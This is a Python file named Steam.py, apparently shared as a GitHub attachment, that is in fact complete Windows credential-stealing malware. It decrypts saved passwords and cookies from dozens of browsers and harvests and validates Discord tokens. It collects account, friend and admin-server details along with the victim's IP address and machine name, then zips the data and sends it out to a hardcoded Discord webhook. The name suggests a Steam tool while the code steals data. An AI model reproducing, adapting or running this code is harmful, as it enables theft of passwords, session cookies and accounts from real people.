[Steam.py](https://github.com/user-attachments/files/21936218/Steam.py)
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import sqlite3
import shutil
import tempfile
from os.path import isfile, join
import zipfile

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_passwords(path, master_key):
    passwords = []
    try:
        login_db = os.path.join(path, 'Login Data')
        if not isfile(login_db): 
            return passwords
            
        temp_file = os.path.join(tempfile.gettempdir(), "login_db")
        shutil.copy2(login_db, temp_file)
        
        conn = sqlite3.connect(temp_file)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            try:
                if encrypted_password[:4] == b'\x01\x00\x00\x00':
                    decrypted_password = decrypt(encrypted_password, master_key)
                    if username != "" and decrypted_password != "Error":
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted_password
                        })
            except Exception as e:
                pass
                
        cursor.close()
        conn.close()
        try:
            os.remove(temp_file)
        except:
            pass
    except Exception as e:
        pass
        
    return passwords

def get_cookies(path, master_key):
    cookies = []
    try:
        cookies_db = os.path.join(path, 'Cookies')
        if not isfile(cookies_db): 
            return cookies
            
        temp_file = os.path.join(tempfile.gettempdir(), "cookies_db")
        shutil.copy2(cookies_db, temp_file)
        
        conn = sqlite3.connect(temp_file)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_cookie = row[2]
            
            try:
                if encrypted_cookie[:4] == b'\x01\x00\x00\x00':
                    decrypted_cookie = decrypt(encrypted_cookie, master_key)
                    if decrypted_cookie != "Error":
                        cookies.append({
                            "host": host,
                            "name": name,
                            "value": decrypted_cookie
                        })
            except Exception as e:
                pass
                
        cursor.close()
        conn.close()
        try:
            os.remove(temp_file)
        except:
            pass
    except Exception as e:
        pass
        
    return cookies

def get_discord_info(token):
    """Get detailed Discord information including friends and servers with admin permissions"""
    friends_info = []
    guilds_info = []
    admin_guilds = []
    
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    
    # Get friends list
    try:
        friends_res = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if friends_res.status_code == 200:
            friends_data = friends_res.json()
            for friend in friends_data:
                try:
                    friends_info.append({
                        'id': friend['id'],
                        'username': f"{friend['user']['username']}#{friend['user']['discriminator']}",
                        'type': friend['type']  # 1 = friend, 2 = blocked, 3 = pending
                    })
                except:
                    pass
    except Exception as e:
        pass
    
    # Get guilds (servers)
    try:
        guilds_res = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
        if guilds_res.status_code == 200:
            guilds_data = guilds_res.json()
            for guild in guilds_data:
                guild_info = {
                    'id': guild['id'],
                    'name': guild['name'],
                    'owner': guild.get('owner', False)
                }
                guilds_info.append(guild_info)
                
                # Check for admin permissions (0x8 is the administrator permission bit)
                permissions = int(guild.get('permissions', 0))
                if permissions & 0x8 or guild.get('owner', False):
                    admin_guilds.append(guild_info)
    except Exception as e:
        pass
    
    return {
        'friends': friends_info,
        'guilds': guilds_info,
        'admin_guilds': admin_guilds,
        'friends_count': len(friends_info),
        'guilds_count': len(guilds_info),
        'admin_guilds_count': len(admin_guilds)
    }

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + '\\Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default',
        'Thorium': local + '\\Thorium\\User Data\\Default',
        'Chromium': local + '\\Chromium\\User Data\\Default',
        'Slimjet': local + '\\Slimjet\\User Data\\Default',
        'Avast Browser': local + '\\AVAST Software\\Browser\\User Data\\Default',
        'SRWare Iron': local + '\\Chromium\\User Data\\Default',
        'Comodo Dragon': local + '\\Comodo\\Dragon\\User Data\\Default',
        'Coc Coc': local + '\\CocCoc\\Browser\\User Data\\Default',
        'Blisk': local + '\\Blisk\\User Data\\Default',
        'Maxthon': local + '\\Maxthon5\\Users\\Default',
        'K-Meleon': local + '\\K-Meleon',
        'Citrio': local + '\\CatalinaGroup\\Citrio\\User Data\\Default',
        'Sleipnir 6': local + '\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer',
        'Falkon': roaming + '\\falkon',
        'Mozilla Firefox': roaming + '\\Mozilla\\Firefox\\Profiles',
        'Pale Moon': roaming + '\\Moonchild Productions\\Pale Moon\\Profiles',
        'Waterfox': roaming + '\\Waterfox\\Profiles',
        'LibreWolf': roaming + '\\LibreWolf\\Profiles',
        'Whale': local + '\\Naver\\Naver Whale\\User Data\\Default',
        'Cent': local + '\\CentBrowser\\User Data\\Default',
        'Elements Browser': local + '\\Elements Browser\\User Data\\Default',
        'Chromodo': local + '\\Chromodo\\User Data\\Default',
        'Superbird': local + '\\Superbird\\User Data\\Default',
        'Arc': local + '\\Arc\\User Data\\Default',
        'Sidekick': local + '\\Sidekick\\User Data\\Default',
        'QQBrowser': local + '\\Tencent\\QQBrowser\\User Data\\Default',
        '360 Browser': local + '\\360Chrome\\Chrome\\User Data\\Default',
        'Brave Nightly': local + '\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default',
        'Brave Beta': local + '\\BraveSoftware\\Brave-Browser-Beta\\User Data\\Default',
        'Microsoft Edge Beta': local + '\\Microsoft\\Edge Beta\\User Data\\Default',
        'Microsoft Edge Dev': local + '\\Microsoft\\Edge Dev\\User Data\\Default',
        'Microsoft Edge Canary': local + '\\Microsoft\\Edge SxS\\User Data\\Default',
        'Chrome Beta': local + '\\Google\\Chrome Beta\\User Data\\Default',
        'Chrome Dev': local + '\\Google\\Chrome Dev\\User Data\\Default',
        'Chrome Canary': local + '\\Google\\Chrome SxS\\User Data\\Default',
        'Opera Beta': roaming + '\\Opera Software\\Opera Beta\\Stable',
        'Opera Developer': roaming + '\\Opera Software\\Opera Developer\\Stable',
        'Opera Neon': roaming + '\\Opera Software\\Opera Neon\\User Data\\Default',
        'Ungoogled Chromium': local + '\\Chromium\\User Data\\Default',
        'SlimBrowser': local + '\\SlimBrowser\\User Data\\Default',
        'Sushi Browser': local + '\\Sushi Browser\\User Data\\Default',
        'Colibri': local + '\\Colibri\\User Data\\Default'
    }
    
    all_passwords = []
    all_cookies = []
    
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        
        if platform not in ['Discord', 'Discord Canary', 'Lightcord', 'Discord PTB']:
            master_key = b64decode(key)[5:]
            browser_passwords = get_passwords(path, master_key)
            browser_cookies = get_cookies(path, master_key)
            
            if browser_passwords:
                all_passwords.extend([{
                    "platform": platform,
                    "data": browser_passwords
                }])
            
            if browser_cookies:
                all_cookies.extend([{
                    "platform": platform,
                    "data": browser_cookies
                }])
        
        for file in listdir(path + "\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        
        try:
            for file in listdir(path + "\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and not file.endswith(".log"): continue
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for line in files.readlines():
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                tokens.append(token)
        except:
            pass
        
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
                
        for token in cleaned:
            try:
                if token.startswith("dQw4w9WgXcQ:"):
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                else:
                    tok = token
            except:
                continue
                
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': value, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        
                        discord_info = get_discord_info(value)
                        
                        temp_dir = os.path.join(tempfile.gettempdir(), f"discord_data_{user_id}")
                        os.makedirs(temp_dir, exist_ok=True)
                        
                        passwords_file = os.path.join(temp_dir, "passwords.json")
                        cookies_file = os.path.join(temp_dir, "cookies.json")
                        discord_file = os.path.join(temp_dir, "discord_info.json")
                        
                        with open(passwords_file, 'w') as f:
                            json.dump(all_passwords, f, indent=4)
                            
                        with open(cookies_file, 'w') as f:
                            json.dump(all_cookies, f, indent=4)
                            
                        with open(discord_file, 'w') as f:
                            json.dump(discord_info, f, indent=4)
                        
                        zip_path = os.path.join(tempfile.gettempdir(), f"{user_id}_data.zip")
                        with zipfile.ZipFile(zip_path, 'w') as zipf:
                            for root, dirs, files in os.walk(temp_dir):
                                for file in files:
                                    zipf.write(os.path.join(root, file), 
                                              os.path.relpath(os.path.join(root, file), 
                                                             os.path.join(temp_dir, '..')))
                        
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :busts_in_silhouette: __Discord Info__\n\tFriends: `{discord_info['friends_count']}`\n\tServers: `{discord_info['guilds_count']}`\n\tAdmin Servers: `{discord_info['admin_guilds_count']}`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{value}`\n"""

                        admin_servers = "**ADMIN SERVERS:**\n"
                        for guild in discord_info['admin_guilds'][:10]:
                            admin_servers += f"• {guild['name']} ({guild['id']}){' - Owner' if guild.get('owner') else ''}\n"
                        
                        if len(discord_info['admin_guilds']) > 10:
                            admin_servers += f"... and {len(discord_info['admin_guilds']) - 10} more\n"
                        
                        payloads = []
                        payloads.append(json.dumps({
                            'content': embed, 
                            'username': 'NatsumiGOD', 
                            'avatar_url': 'https://pin.it/2fAEkuMLG'
                        }))
                        
                        if discord_info['admin_guilds']:
                            payloads.append(json.dumps({
                                'content': admin_servers, 
                                'username': 'TESTNUKE', 
                                'avatar_url': 'https://pin.it/2fAEkuMLG'
                            }))

                        if all_passwords or all_cookies or discord_info:
                            files = {
                                'file': open(zip_path, 'rb')
                            }
                            
                            try:
                                webhook_url = 'DISCORD WEBHOOK URL HERE'
                                response = requests.post(
                                    webhook_url,
                                    files=files,
                                    data={'content': f"**Credentials for {user_name}**", 'username': 'NatsumiGOD Data'}
                                )
                            except Exception as e:
                                if all_passwords:
                                    password_count = sum(len(p['data']) for p in all_passwords)
                                    password_summary = f"Found {password_count} passwords from {len(all_passwords)} browsers"
                                    payloads.append(json.dumps({
                                        'content': f"**Password Summary:**\n{password_summary}", 
                                        'username': 'TESTNUKE PASSWORD GRABBER', 
                                        'avatar_url': 'https://pin.it/2fAEkuMLG'
                                    }))
                                
                                if all_cookies:
                                    cookie_count = sum(len(c['data']) for c in all_cookies)
                                    cookie_summary = f"Found {cookie_count} cookies from {len(all_cookies)} browsers"
                                    payloads.append(json.dumps({
                                        'content': f"**Cookie Summary:**\n{cookie_summary}", 
                                        'username': 'TESTNUKE PASSWORD GRABBER', 
                                        'avatar_url': 'https://pin.it/2fAEkuMLG'
                                    }))
                                    
                                if password_count > 0:
                                    sample_passwords = []
                                    for browser in all_passwords[:3]:
                                        for pwd in browser['data'][:5]:
                                            sample_passwords.append({
                                                'browser': browser['platform'],
                                                'url': pwd['url'],
                                                'username': pwd['username'],
                                                'password': pwd['password']
                                            })
                                    
                                    if sample_passwords:
                                        sample_json = json.dumps(sample_passwords, indent=2)
                                        payloads.append(json.dumps({
                                            'content': f"**Password Samples:**\n```json\n{sample_json[:1900]}```", 
                                            'username': 'NatsumiGOD Password Sample', 
                                            'avatar_url': 'https://pin.it/2fAEkuMLG'
                                        }))
                        
                        for payload in payloads:
                            try:
                                headers2 = {
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                                }
                                req = Request('https://discord.com/api/webhooks/1408391873252556862/IbWtMahM659QSVrTJtf2LEjnv-KOSHYPdMV_0FVFd-agIWTIVI9MkrJyOznp3M5Kdd9Z', data=payload.encode(), headers=headers2)
                                urlopen(req)
                            except: continue
                        
                        try:
                            shutil.rmtree(temp_dir)
                            os.remove(zip_path)
                        except: pass
                else: continue

if __name__ == '__main__':
    get_token()
